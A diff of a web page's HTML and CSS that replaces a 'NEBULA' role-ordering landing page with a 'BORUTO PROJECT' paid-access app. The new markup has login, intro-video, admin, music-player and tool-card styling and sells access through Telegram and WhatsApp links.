+.pwd-strength .bar-fill{height:100%;width:0;transition:width .3s ease;background:var(--textDim);}
+.pwd-strength .bar-fill.weak{background:var(--red);}
+.pwd-strength .bar-fill.medium{background:var(--amber);}
+.pwd-strength .bar-fill.strong{background:var(--green);}
+.pwd-strength .lbl{font-family:'Space Mono',monospace;font-size:10px;font-weight:900;min-width:52px;text-align:right;color:var(--textDim);}
+.pwd-strength .lbl.weak{color:var(--red);}
+.pwd-strength .lbl.medium{color:var(--amber);}
+.pwd-strength .lbl.strong{color:var(--green);}
+.pwd-tips{padding:12px 14px;margin-top:16px;background:rgba(37,99,235,.06);border:3px solid var(--border);box-shadow:3px 3px 0 var(--border);}
+.pwd-tips-head{font-family:'Space Mono',monospace;font-size:10px;font-weight:900;margin-bottom:8px;}
+.pwd-tips ul{list-style:none;padding:0;margin:0;}
+.pwd-tips li{font-family:'Space Mono',monospace;font-size:10px;color:var(--textDim);line-height:1.6;padding-left:12px;position:relative;font-weight:600;}
+.pwd-tips li::before{content:"";position:absolute;left:0;top:7px;width:5px;height:5px;background:var(--gold);border:1px solid var(--border);}
+.pwd-shake{animation:pwdShake .5s ease;}
+@keyframes pwdShake{0%,100%{transform:translateX(0);}15%{transform:translateX(-10px);}30%{transform:translateX(10px);}45%{transform:translateX(-8px);}60%{transform:translateX(8px);}75%{transform:translateX(-5px);}90%{transform:translateX(5px);}}
+
+/* ADMIN */
+.admin-form-wrap{max-height:0;overflow:hidden;transition:max-height .5s ease;}
+.admin-form-wrap.open{max-height:5000px;}
+.admin-form-inner{padding:18px;background:var(--surface);border:4px solid var(--border);border-top:0;box-shadow:5px 5px 0 var(--border);margin-bottom:14px;}
+.admin-locked{padding:24px 18px;text-align:center;background:#FEF2F2;border:3px solid var(--red);box-shadow:4px 4px 0 var(--red);}
+.admin-locked .lock-icon{width:56px;height:56px;margin:0 auto 14px;background:var(--red);color:#FFF;border:3px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:24px;}
+.admin-locked .lock-title{font-family:Orbitron,sans-serif;font-size:15px;font-weight:900;color:var(--red);margin-bottom:8px;}
+.admin-locked .lock-msg{font-family:'Space Mono',monospace;font-size:11px;color:var(--textSub);font-weight:600;line-height:1.5;}
+.admin-section-head{display:flex;align-items:center;gap:10px;margin-bottom:16px;}
+.admin-section-head .bar{width:5px;height:20px;background:var(--gold);border:2px solid var(--border);}
+.admin-section-head .ttl{font-size:15px;font-weight:800;}
+.admin-label{font-family:'Space Mono',monospace;font-size:10px;font-weight:900;letter-spacing:1.5px;margin-bottom:8px;display:block;}
+.admin-label .req{color:var(--red);}
+.neo-select{position:relative;margin-bottom:14px;}
+.neo-select-trigger{width:100%;min-height:54px;background:var(--surface);border:3px solid var(--border);box-shadow:5px 5px 0 var(--border);padding:14px 18px;display:flex;align-items:center;justify-content:space-between;cursor:pointer;font-family:'Space Mono',monospace;font-size:13px;font-weight:900;}
+.neo-select-trigger.open{border-color:var(--blue);box-shadow:5px 5px 0 var(--blue);}
+.neo-select-trigger .arrow{color:var(--blue);font-size:14px;transition:transform .3s;}
+.neo-select-trigger.open .arrow{transform:rotate(180deg);}
+.neo-select-panel{max-height:0;overflow:hidden;transition:max-height .35s ease;margin-top:2px;}
+.neo-select-panel.open{max-height:400px;overflow-y:auto;}
+.neo-select-list{background:var(--surface);border:3px solid var(--border);border-top:0;box-shadow:5px 5px 0 var(--border);padding:6px;}
+.neo-select-item{padding:11px 14px;font-family:'Space Mono',monospace;font-size:12px;font-weight:700;cursor:pointer;border:2px solid transparent;display:flex;align-items:center;justify-content:space-between;}
+.neo-select-item:hover{background:#FEF9C3;}
+.neo-select-item.selected{background:var(--gold);border:2px solid var(--border);box-shadow:2px 2px 0 var(--border);font-weight:900;}
+.neo-select-item .badge{font-size:9px;padding:2px 6px;border:1px solid var(--border);background:#FFF;}
+.neo-select-item .badge.blocked{background:var(--red);color:#FFF;}
+.admin-result-box{margin-top:6px;margin-bottom:14px;padding:14px 16px;background:var(--surface);border:3px solid var(--border);box-shadow:4px 4px 0 var(--border);}
+.admin-result-lbl{font-family:'Space Mono',monospace;font-size:9px;font-weight:700;color:var(--textDim);letter-spacing:1.5px;margin-bottom:4px;}
+.admin-result-val{font-family:Orbitron,sans-serif;font-size:16px;font-weight:900;}
+.admin-result-val.gold{color:var(--goldDark);}
+.admin-result-val.blue{color:var(--blue);}
+.admin-result-val.green{color:var(--green);}
+.admin-result-val.red{color:var(--red);}
+.admin-access-badge{display:inline-flex;align-items:center;gap:6px;padding:5px 12px;border:2px solid var(--border);font-family:'Space Mono',monospace;font-size:10px;font-weight:900;margin-top:8px;}
+.admin-access-badge.granted{background:var(--green);color:#FFF;}
+.admin-access-badge.denied{background:var(--red);color:#FFF;}
+.admin-submit-btn{width:100%;height:52px;background:var(--gold);color:var(--text);border:3px solid var(--border);box-shadow:5px 5px 0 var(--border);font-family:Orbitron,sans-serif;font-size:14px;font-weight:900;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-top:16px;}
+.admin-submit-btn:disabled{background:#9CA3AF;}
+.admin-note{margin-top:14px;padding:12px 14px;background:rgba(250,204,21,.1);border:3px solid var(--border);box-shadow:3px 3px 0 var(--border);font-family:'Space Mono',monospace;font-size:10px;color:var(--textDim);font-weight:600;line-height:1.5;}
+.admin-note strong{color:var(--text);}
+.admin-user-list{margin-top:20px;padding-top:16px;border-top:3px dashed var(--border);}
+.admin-user-list-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;}
+.admin-user-list-title{font-family:Orbitron,sans-serif;font-size:12px;font-weight:900;letter-spacing:1.5px;}
+.admin-user-count{font-family:'Space Mono',monospace;font-size:10px;font-weight:900;padding:3px 8px;background:var(--blue);color:#FFF;border:2px solid var(--border);}
+.admin-user-item{background:var(--surface);border:3px solid var(--border);box-shadow:3px 3px 0 var(--border);padding:10px 12px;margin-bottom:10px;display:flex;align-items:center;gap:10px;}
+.admin-user-name{font-family:Orbitron,sans-serif;font-size:12px;font-weight:900;}
+.admin-user-meta{font-family:'Space Mono',monospace;font-size:9px;color:var(--textDim);font-weight:700;margin-top:2px;}
+.admin-user-role{display:inline-block;padding:2px 6px;background:var(--gold);border:2px solid var(--border);font-family:'Space Mono',monospace;font-size:9px;font-weight:900;margin-right:4px;}
+.admin-user-del{width:32px;height:32px;flex-shrink:0;background:var(--red);color:#FFF;border:3px solid var(--border);box-shadow:3px 3px 0 var(--border);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:12px;}
+.admin-user-empty{text-align:center;padding:20px;font-family:'Space Mono',monospace;font-size:10px;color:var(--textDim);font-weight:700;}
+.admin-user-status{display:inline-flex;align-items:center;gap:4px;padding:2px 7px;border:2px solid var(--border);font-family:'Space Mono',monospace;font-size:9px;font-weight:900;margin-left:4px;}
+.admin-user-status.active{background:var(--green);color:#FFF;}
+.admin-user-status.warning{background:var(--amber);color:#FFF;}
+.admin-user-status.expired{background:var(--red);color:#FFF;}
+.admin-user-status.permanent{background:var(--blue);color:#FFF;}
+
+/* MUSIC */
+.music-wrap{max-height:0;overflow:hidden;transition:max-height .5s ease;}
+.music-wrap.open{max-height:4000px;}
+.music-inner{padding:18px;background:var(--surface);border:4px solid var(--border);border-top:0;box-shadow:5px 5px 0 var(--border);margin-bottom:14px;}
+.music-search{display:flex;align-items:center;gap:10px;height:52px;padding:0 14px;background:var(--surface);border:3px solid var(--border);box-shadow:4px 4px 0 var(--border);margin-bottom:14px;}
+.music-search input{flex:1;border:0;outline:0;font-family:'Space Mono',monospace;font-size:13px;font-weight:700;background:transparent;}
+.music-search button{background:var(--gold);color:var(--text);border:2px solid var(--border);box-shadow:2px 2px 0 var(--border);padding:6px 12px;font-family:'Orbitron',sans-serif;font-size:11px;font-weight:900;cursor:pointer;}
+.music-nowplaying{display:flex;align-items:center;gap:12px;padding:12px;margin-bottom:14px;background:var(--surface);border:3px solid var(--border);box-shadow:4px 4px 0 var(--border);}
+.music-cover{width:64px;height:64px;flex-shrink:0;border:3px solid var(--border);box-shadow:3px 3px 0 var(--border);background:var(--blue);display:flex;align-items:center;justify-content:center;overflow:hidden;border-radius:50%;}
+.music-cover img{width:100%;height:100%;object-fit:cover;}
+.music-cover.spinning{animation:rotateRing 8s linear infinite;}
+.music-title{font-family:Orbitron,sans-serif;font-size:14px;font-weight:900;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:3px;}
+.music-artist{font-family:'Space Mono',monospace;font-size:11px;color:var(--textDim);font-weight:700;}
+.music-progress{margin-bottom:14px;padding:10px 12px;background:var(--surface);border:3px solid var(--border);box-shadow:4px 4px 0 var(--border);}
+.music-progress-bar{width:100%;height:8px;background:#E5E7EB;border:2px solid var(--border);overflow:hidden;cursor:pointer;margin-bottom:8px;}
+.music-progress-fill{height:100%;width:0;background:var(--blue);}
+.music-time-row{display:flex;justify-content:space-between;font-family:'Space Mono',monospace;font-size:10px;font-weight:700;color:var(--textDim);}
+.music-controls{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:14px;}
+.music-btn{width:44px;height:44px;background:var(--surface);border:3px solid var(--border);box-shadow:3px 3px 0 var(--border);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:16px;}
+.music-btn.active{background:var(--gold);}
+.music-btn.play{width:58px;height:58px;background:var(--blue);color:#FFF;font-size:22px;}
+.music-volume{display:flex;align-items:center;gap:10px;padding:10px 12px;margin-bottom:14px;background:var(--surface);border:3px solid var(--border);box-shadow:4px 4px 0 var(--border);}
+.music-volume input[type=range]{flex:1;height:6px;-webkit-appearance:none;background:#E5E7EB;border:2px solid var(--border);}
+.music-tabs{display:flex;gap:6px;margin-bottom:14px;}
+.music-tab{flex:1;padding:8px 6px;background:var(--surface);border:3px solid var(--border);box-shadow:3px 3px 0 var(--border);font-family:'Space Mono',monospace;font-size:10px;font-weight:900;cursor:pointer;color:var(--textDim);text-align:center;}
+.music-tab.active{background:var(--gold);color:var(--text);}
+.music-list{max-height:400px;overflow-y:auto;border:3px solid var(--border);box-shadow:4px 4px 0 var(--border);background:var(--surface);padding:6px;}
+.music-item{display:flex;align-items:center;gap:10px;padding:8px;margin-bottom:6px;background:var(--surface);border:2px solid var(--border);cursor:pointer;}
+.music-item.playing{background:rgba(37,99,235,.1);border-color:var(--blue);}
+.music-item-thumb{width:44px;height:44px;flex-shrink:0;border:2px solid var(--border);background:var(--blue);display:flex;align-items:center;justify-content:center;overflow:hidden;}
+.music-item-thumb img{width:100%;height:100%;object-fit:cover;}
+.music-item-title{font-size:12px;font-weight:800;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.music-item-artist{font-family:'Space Mono',monospace;font-size:9px;color:var(--textDim);font-weight:700;}
+.music-item-dur{font-family:'Space Mono',monospace;font-size:9px;font-weight:900;color:var(--blue);padding:2px 6px;border:2px solid var(--border);background:#EFF6FF;flex-shrink:0;}
+.music-item-actions{display:flex;flex-direction:column;gap:4px;flex-shrink:0;}
+.music-item-action{width:24px;height:24px;border:2px solid var(--border);background:var(--surface);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:10px;}
+.music-item-action.fav.active{background:var(--red);color:#FFF;}
+.music-item-action.dl.active{background:var(--green);color:#FFF;}
+.music-empty{text-align:center;padding:30px 20px;font-family:'Space Mono',monospace;color:var(--textDim);}
+.music-loading{display:flex;align-items:center;justify-content:center;gap:8px;padding:16px;font-family:'Space Mono',monospace;font-size:11px;color:var(--textDim);font-weight:700;}
+
+/* TOOLS */
+.tools-wrap{max-height:0;overflow:hidden;transition:max-height .5s ease;}
+.tools-wrap.open{max-height:3500px;}
+.tools-inner{padding:18px;background:var(--surface);border:4px solid var(--border);border-top:0;box-shadow:5px 5px 0 var(--border);margin-bottom:14px;}
+.tools-section-head{display:flex;align-items:center;gap:10px;margin-bottom:14px;}
+.tools-section-head .bar{width:5px;height:20px;background:var(--gold);border:2px solid var(--border);}
+.tools-section-head .ttl{font-size:15px;font-weight:800;}
+.tools-section-head .count{margin-left:auto;font-family:'Space Mono',monospace;font-size:10px;font-weight:900;color:var(--textDim);}
+.tools-grid{display:grid;grid-template-columns:repeat(3, 1fr);gap:10px;margin-bottom:14px;}
+.tool-cat-card{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;padding:12px 6px;background:var(--surface);border:3px solid var(--border);box-shadow:4px 4px 0 var(--border);cursor:pointer;min-height:110px;text-align:center;}
+.tool-cat-card.open{background:var(--gold);}
+.tool-cat-icon{width:44px;height:44px;border:3px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:20px;color:#FFF;}
+.tool-cat-icon.teal{background:var(--green);}
+.tool-cat-icon.red{background:var(--red);}
+.tool-cat-icon.green{background:var(--green);}
+.tool-cat-icon.purple{background:#A78BFA;}
+.tool-cat-icon.amber{background:var(--amber);color:var(--text);}
+.tool-cat-icon.blue{background:var(--blue);}
+.tool-cat-icon.pink{background:#F472B6;}
+.tool-cat-title{font-family:Orbitron,sans-serif;font-size:10px;font-weight:900;line-height:1.2;}
+.tool-cat-sub{font-family:'Space Mono',monospace;font-size:8px;font-weight:700;color:var(--textDim);}
+.tool-sub-wrap{max-height:0;overflow:hidden;transition:max-height .4s ease;}
+.tool-sub-wrap.open{max-height:900px;margin-bottom:14px;}
+.tool-sub-inner{padding:14px;background:var(--surface);border:3px solid var(--border);border-top:0;box-shadow:4px 4px 0 var(--border);}
+.tool-sub-head{display:flex;align-items:center;gap:8px;margin-bottom:12px;padding-bottom:8px;border-bottom:2px dashed var(--border);}
+.tool-sub-head .ttl{font-family:Orbitron,sans-serif;font-size:12px;font-weight:900;flex:1;}
+.tool-item{display:flex;align-items:center;gap:10px;padding:10px;margin-bottom:8px;background:var(--surface);border:2px solid var(--border);box-shadow:3px 3px 0 var(--border);cursor:pointer;}
+.tool-item-icon{width:36px;height:36px;flex-shrink:0;background:var(--blue);color:#FFF;border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:14px;}
+.tool-item-label{font-size:12px;font-weight:800;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.tool-item-sub{font-family:'Space Mono',monospace;font-size:9px;font-weight:700;color:var(--textDim);}
+.tool-item.soon{opacity:.6;cursor:not-allowed;}
+.tool-item-badge{font-family:'Space Mono',monospace;font-size:8px;font-weight:900;padding:2px 6px;background:var(--amber);border:1px solid var(--border);}
+
+/* MODAL */
+.modal-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:300;display:none;align-items:center;justify-content:center;padding:20px;}
+.modal-backdrop.show{display:flex;}
+.modal-box{width:100%;max-width:420px;background:var(--surface);border:4px solid var(--border);box-shadow:8px 8px 0 var(--border);max-height:90vh;overflow-y:auto;}
+.modal-head{background:var(--gold);border-bottom:4px solid var(--border);padding:14px 18px;display:flex;align-items:center;gap:12px;}
+.modal-head .m-icon{width:40px;height:40px;background:var(--surface);border:3px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:18px;color:var(--red);flex-shrink:0;}
+.modal-head h3{font-family:Orbitron,sans-serif;font-size:16px;font-weight:900;flex:1;}
+.modal-head .m-close{width:36px;height:36px;background:var(--surface);border:3px solid var(--border);display:flex;align-items:center;justify-content:center;cursor:pointer;}
+.modal-body{padding:18px;}
+.modal-field{margin-bottom:16px;}
+.modal-field label{display:block;font-family:'Space Mono',monospace;font-size:10px;font-weight:900;margin-bottom:8px;}
+.modal-field input,.modal-field textarea,.modal-field select{width:100%;padding:12px 14px;background:var(--surface);border:3px solid var(--border);box-shadow:4px 4px 0 var(--border);font-family:'Space Mono',monospace;font-size:13px;font-weight:700;outline:none;resize:none;}
+.modal-field textarea{min-height:80px;line-height:1.5;}
+.modal-actions{padding:0 18px 18px;display:flex;gap:10px;}
+.modal-btn{flex:1;height:48px;border:3px solid var(--border);box-shadow:4px 4px 0 var(--border);font-family:Orbitron,sans-serif;font-size:13px;font-weight:900;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px;}
+.modal-btn.cancel{background:var(--surface);}
+.modal-btn.send{background:var(--red);color:#FFF;}
+
+/* RESULT */
+.result-dialog-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:500;display:none;align-items:center;justify-content:center;padding:20px;}
+.result-dialog-backdrop.show{display:flex;}
+.result-dialog{width:100%;max-width:360px;background:var(--surface);border:4px solid var(--border);box-shadow:8px 8px 0 var(--border);padding:26px 22px;text-align:center;}
+.result-dialog.success{border-color:var(--green);box-shadow:8px 8px 0 var(--green);}
+.result-dialog.error{border-color:var(--red);box-shadow:8px 8px 0 var(--red);}
+.result-icon{width:64px;height:64px;margin:0 auto 16px;border:3px solid var(--border);box-shadow:4px 4px 0 var(--border);display:flex;align-items:center;justify-content:center;font-size:28px;color:#FFF;background:var(--blue);}
+.result-dialog.success .result-icon{background:var(--green);}
+.result-dialog.error .result-icon{background:var(--red);}
+.result-title{font-family:Orbitron,sans-serif;font-size:18px;font-weight:900;margin-bottom:10px;}
+.result-msg{font-family:'Space Mono',monospace;font-size:12px;color:var(--textSub);line-height:1.5;margin-bottom:22px;font-weight:600;white-space:pre-line;text-align:left;}
+.result-btn{width:100%;height:48px;background:var(--blue);color:#FFF;border:3px solid var(--border);box-shadow:4px 4px 0 var(--border);font-family:Orbitron,sans-serif;font-size:14px;font-weight:900;cursor:pointer;}
+.result-dialog.success .result-btn{background:var(--green);}
+.result-dialog.error .result-btn{background:var(--red);}
+
+/* TOAST */
+.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(20px);padding:12px 20px;background:#000;border:2px solid var(--gold);color:#fff;font-size:12px;font-weight:700;box-shadow:5px 5px 0 var(--gold);opacity:0;transition:opacity .3s,transform .3s;pointer-events:none;z-index:400;max-width:90vw;text-align:center;font-family:'Space Mono',monospace;}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
+
+/* LOG */
+.log-item{padding:10px;background:var(--surface);border:2px solid var(--border);box-shadow:3px 3px 0 var(--border);margin-bottom:8px;}
+.log-item-cmd{font-family:'Space Mono',monospace;font-size:11px;font-weight:900;color:var(--text);margin-bottom:4px;}
+.log-item-meta{font-family:'Space Mono',monospace;font-size:9px;color:var(--textDim);font-weight:700;}
+
+/* KEYFRAMES */
+@keyframes floatY{0%,100%{transform:translateY(0);}50%{transform:translateY(-8px);}}
+@keyframes iconBounce{0%,100%{transform:translateY(0) rotate(0);}25%{transform:translateY(-3px) rotate(-4deg);}75%{transform:translateY(-3px) rotate(4deg);}}
+@keyframes popIn{0%{opacity:0;transform:scale(.85) translateY(20px);}100%{opacity:1;transform:scale(1) translateY(0);}}
+@keyframes slideInLeft{0%{opacity:0;transform:translateX(-30px);}100%{opacity:1;transform:translateX(0);}}
+@keyframes rotateRing{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+@keyframes spinPulse{0%,100%{transform:scale(1);opacity:1;}50%{transform:scale(1.06);opacity:.85;}}
+@keyframes pulseGlow{0%,100%{box-shadow:6px 6px 0 var(--border);}50%{box-shadow:6px 6px 0 var(--border), 0 0 25px rgba(250,204,21,.55);}}
+@keyframes logoBreath{0%,100%{transform:scale(1);box-shadow:10px 10px 0 var(--border);}50%{transform:scale(1.04);box-shadow:12px 12px 0 var(--border), 0 0 35px rgba(37,99,235,.6), 0 0 60px rgba(250,204,21,.3);}}
+@keyframes imgPulse{0%,100%{filter:brightness(1) saturate(1);}50%{filter:brightness(1.15) saturate(1.2);}}
+@keyframes gridMove{0%{background-position:0 0, 0 0;}100%{background-position:40px 40px, 40px 40px;}}
+@keyframes neonPulse{0%,100%{text-shadow:5px 5px 0 var(--gold), 0 0 10px rgba(250,204,21,.5);}50%{text-shadow:5px 5px 0 var(--gold), 0 0 20px rgba(250,204,21,.9), 0 0 40px rgba(250,204,21,.5);}}
+@keyframes pageEnter{0%{opacity:0;transform:translateY(15px);}100%{opacity:1;transform:translateY(0);}}
+@keyframes toastShake{0%{transform:translateX(-50%) translateY(20px) scale(.9);}50%{transform:translateX(-50%) translateY(0) scale(1.08);}100%{transform:translateX(-50%) translateY(0) scale(1);}}
+
+.landing-hero{animation:floatY 3s ease-in-out infinite;}
+.landing-hero-ring-gold{animation:rotateRing 12s linear infinite;transform-origin:center center;}
+.landing-hero-ring-blue{animation:rotateRing 8s linear infinite reverse;transform-origin:center center;}
+.landing-hero-core{animation:logoBreath 2.5s ease-in-out infinite;}
+.landing-hero-core img{animation:imgPulse 3s ease-in-out infinite;}
+.login-logo-wrap{animation:floatY 3s ease-in-out infinite;}
+.ring-gold{animation:rotateRing 12s linear infinite;transform-origin:center center;}
+.ring-blue{animation:rotateRing 8s linear infinite reverse;transform-origin:center center;}
+.login-logo-core{animation:logoBreath 2.5s ease-in-out infinite;}
+.login-logo-core img{animation:imgPulse 3s ease-in-out infinite;}
+.nbr-banner{animation:popIn .6s cubic-bezier(.34,1.56,.64,1) both, floatY 4s ease-in-out infinite 0.6s;}
+.nbr-topbar-logo{animation:pulseGlow 2s ease-in-out infinite;}
+.nbr-logo-text{animation:spinPulse 2.5s ease-in-out infinite;}
+.nbr-side-tab{animation:pulseGlow 3s ease-in-out infinite;}
+.nbr-avatar{animation:spinPulse 3s ease-in-out infinite;}
+.nbr-action-card{animation:slideInLeft .5s cubic-bezier(.34,1.56,.64,1) both;}
+.landing-page, .login-page{animation:gridMove 20s linear infinite;}
+.landing-title, .login-title{animation:popIn .8s cubic-bezier(.34,1.56,.64,1) both, neonPulse 2.5s ease-in-out infinite 1s;}
+.page.active{animation:pageEnter .5s cubic-bezier(.34,1.56,.64,1);}
+.toast.show{animation:toastShake .45s cubic-bezier(.34,1.56,.64,1);}
+@media (prefers-reduced-motion: reduce){
+  *{animation-duration:.01ms !important;animation-iteration-count:1 !important;transition-duration:.01ms !important;}
+}
+
+</style>
 </head>
 <body>
-  <div class="bg-grid"></div>
-  <header class="nav">
-    <a class="brand" href="#"><span class="brand-mark"><i data-lucide="orbit"></i></span><span>NEBULA</span></a>
-    <nav>
-      <a href="#home">Home</a><a href="#roles">Roles</a><a href="#how">How It Works</a>
-    </nav>
-    <button class="nav-btn" onclick="document.getElementById('roles').scrollIntoView({behavior:'smooth'})"><i data-lucide="shopping-cart"></i> Order</button>
-  </header>
 
-  <main id="home">
-    <section class="hero">
-      <div class="hero-copy">
-        <div class="eyebrow"><span></span> AUTO ORDER SYSTEM</div>
-        <h1>POWER UP<br><em>YOUR ROLE.</em></h1>
-        <p>Order role account secara cepat, simpel, dan otomatis. Pilih role, checkout, lalu dapatkan pesananmu.</p>
-        <div class="hero-actions">
-          <button class="primary" onclick="document.getElementById('roles').scrollIntoView({behavior:'smooth'})">Lihat Role <i data-lucide="arrow-right"></i></button>
-          <button class="ghost" onclick="document.getElementById('how').scrollIntoView({behavior:'smooth'})"><i data-lucide="circle-help"></i> Cara Order</button>
+<div id="app">
+
+  <!-- ══════════════════════════════════════ -->
+  <!-- LANDING PAGE                            -->
+  <!-- ══════════════════════════════════════ -->
+  <div class="page" id="page-landing">
+    <div class="landing-page">
+      <div class="landing-glow top"></div>
+      <div class="landing-glow bottom"></div>
+      <div class="landing-hero">
+        <div class="landing-hero-ring-gold"></div>
+        <div class="landing-hero-ring-blue"></div>
+        <div class="landing-hero-core">
+          <img src="https://files.catbox.moe/63v985.jpg" alt="BORUTO PROJECT"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';">
+          <i class="fas fa-bolt" style="display:none;"></i>
         </div>
-        <div class="stats"><div><b>8</b><span>ROLE</span></div><div><b>AUTO</b><span>ORDER</span></div><div><b>24/7</b><span>SERVICE</span></div></div>
       </div>
-      <div class="orb-wrap">
-        <div class="orb"><div class="orb-inner"><i data-lucide="orbit"></i><strong>NEBULA</strong><small>AUTO ORDER</small></div></div>
-        <div class="float-card fc1"><i data-lucide="shield-check"></i><span>Secure<br><b>Order</b></span></div>
-        <div class="float-card fc2"><i data-lucide="zap"></i><span>Fast<br><b>Delivery</b></span></div>
+      <div class="landing-title">BORUTO PROJECT</div>
+      <div class="landing-subtitle">PREMIUM DIGITAL ACCESS</div>
+      <div class="landing-card">
+        <button class="neo-btn" onclick="goToVideoFromLanding()"><i class="fas fa-sign-in-alt"></i><span>LOGIN</span></button>
+        <button class="landing-buy-btn" onclick="window.open('t.me/Ikyyshoppp','_blank')"><i class="fas fa-shopping-cart"></i><span>BUY ACCESS</span></button>
+        <div class="landing-divider"></div>
+        <div class="landing-socials">
+          <div class="landing-social telegram" onclick="window.open('https://t.me/Ikyyshoppp','_blank')"><i class="fab fa-telegram"></i><span>Telegram</span></div>
+          <div class="landing-social whatsapp" onclick="window.open('https://wa.me/6285959552500','_blank')"><i class="fab fa-whatsapp"></i><span>WhatsApp</span></div>
+        </div>
       </div>
-    </section>
-
-    <section class="section" id="roles">
-      <div class="section-head"><div><div class="eyebrow"><span></span> PRICING</div><h2>Choose Your <em>Role</em></h2></div><p>Harga role Nebula yang tersedia.</p></div>
-      <div class="cards" id="cards"></div>
-    </section>
-
-    <section class="how section" id="how">
-      <div class="eyebrow"><span></span> SIMPLE PROCESS</div><h2>Order dalam <em>3 langkah</em></h2>
-      <div class="steps">
-        <div class="step"><div class="num">01</div><i data-lucide="mouse-pointer-click"></i><h3>Pilih Role</h3><p>Pilih role yang sesuai kebutuhanmu.</p></div>
-        <div class="step"><div class="num">02</div><i data-lucide="credit-card"></i><h3>Checkout</h3><p>Masukkan data order dan lanjutkan pembayaran.</p></div>
-        <div class="step"><div class="num">03</div><i data-lucide="package-check"></i><h3>Terima Order</h3><p>Pesanan diproses setelah pembayaran terverifikasi.</p></div>
-      </div>
-    </section>
-  </main>
-
-  <footer><div class="brand"><span class="brand-mark"><i data-lucide="orbit"></i></span> NEBULA</div><span>Auto Order Account</span></footer>
-
-  <div class="modal" id="modal">
-    <div class="modal-box">
-      <button class="close" onclick="closeModal()"><i data-lucide="x"></i></button>
-      <div class="eyebrow"><span></span> CHECKOUT</div>
-      <h2 id="modalRole">Role</h2>
-      <div class="selected"><span>Harga</span><strong id="modalPrice">Rp0</strong></div>
-      <label>Username<input id="username" placeholder="Masukkan username"></label>
-      <label>Kontak<input id="contact" placeholder="Telegram / WhatsApp"></label>
-      <button class="primary full" onclick="submitOrder()">Buat Order <i data-lucide="arrow-right"></i></button>
-      <p class="note">Demo checkout. Hubungkan payment gateway dan backend untuk auto-order production.</p>
+      <div class="landing-footer">SECURE • PRIVATE • EXCLUSIVE</div>
     </div>
   </div>
-  <div class="toast" id="toast"></div>
-  <script src="script.js"></script>
+
+  <!-- ══════════════════════════════════════ -->
+  <!-- LOGIN PAGE                              -->
+  <!-- ══════════════════════════════════════ -->
+  <div class="page" id="page-login">
+    <div class="login-page">
+      <div class="login-logo-wrap">
+        <div class="ring-gold"></div>
+        <div class="ring-blue"></div>
+        <div class="login-logo-core">
+          <img src="https://files.catbox.moe/krkm0s.jpg" alt="BORUTO PROJECT"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';">
+          <i class="fas fa-bolt" style="display:none;"></i>
+        </div>
+      </div>
+      <div class="login-title">BORUTO PROJECT</div>
+      <div class="login-badge">MASUK UNTUK MELANJUTKAN</div>
+      <div class="login-card">
+        <div class="login-section-head">
+          <div class="bar"></div>
+          <i class="fas fa-cog"></i>
+          <span>Kredensial Akun</span>
+        </div>
+        <div class="neo-field" id="fu">
+          <i class="fas fa-user"></i>
+          <input type="text" id="lu" placeholder="Username" autocomplete="username" autocapitalize="off">
+        </div>
+        <div class="neo-field" id="fp">
+          <i class="fas fa-lock"></i>
+          <input type="password" id="lp" placeholder="Password" autocomplete="current-password">
+          <button class="toggle-pass" onclick="togglePass()"><i class="fas fa-eye" id="eye"></i></button>
+        </div>
+        <button class="neo-btn" id="btn-login" onclick="doLogin()"><i class="fas fa-sign-in-alt"></i><span>MASUK</span></button>
+      </div>
+      <div class="login-footer">
+        <div class="buy">Belum Punya Access? <a href="https://t.me/Ikyyshoppp" target="_blank">BUY SEKARANG</a></div>
+        <div class="brand-row"><div class="dot gold"></div>BORUTO PROJECT<div class="dot blue"></div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════ -->
+  <!-- VIDEO INTRO (dari login)                -->
+  <!-- ══════════════════════════════════════ -->
+  <div class="page" id="page-video">
+    <div class="vid-page">
+      <div class="vid-title-bar">
+        <div class="vid-title-dot"></div>
+        <div class="vid-title-text">BORUTO PROJECT</div>
+      </div>
+      <button class="vid-skip" id="vidSkipBtn" type="button">
+        <i class="fas fa-forward"></i> SKIP
+      </button>
+      <div class="vid-wrap">
+        <video id="introVideo" src="https://files.catbox.moe/om51rf.mp4" playsinline preload="auto" webkit-playsinline></video>
+        <div class="vid-play-center" id="vidPlayCenter"><i class="fas fa-play"></i></div>
+      </div>
+      <div class="vid-bottom">
+        <div class="vid-progress-bar" id="vidProgressBar"><div class="vid-progress-fill" id="vidProgressFill"></div></div>
+        <div class="vid-time-row">
+          <div class="label"><i class="fas fa-circle"></i> PLAYING INTRO</div>
+          <div><span id="vidCurrentTime">0:00</span> / <span id="vidTotalTime">0:00</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════ -->
+  <!-- VIDEO FROM LANDING                      -->
+  <!-- ══════════════════════════════════════ -->
+  <div class="page" id="page-video2">
+    <div class="vid-page">
+      <div class="vid-title-bar">
+        <div class="vid-title-dot"></div>
+        <div class="vid-title-text">BORUTO PROJECT</div>
+      </div>
+      <div class="vid-wrap">
+        <video id="introVideo2" src="https://files.catbox.moe/jlxatf.mp4" playsinline preload="auto" webkit-playsinline></video>
+        <div class="vid-play-center" id="vidPlayCenter2"><i class="fas fa-play"></i></div>
+      </div>
+      <div class="vid-bottom">
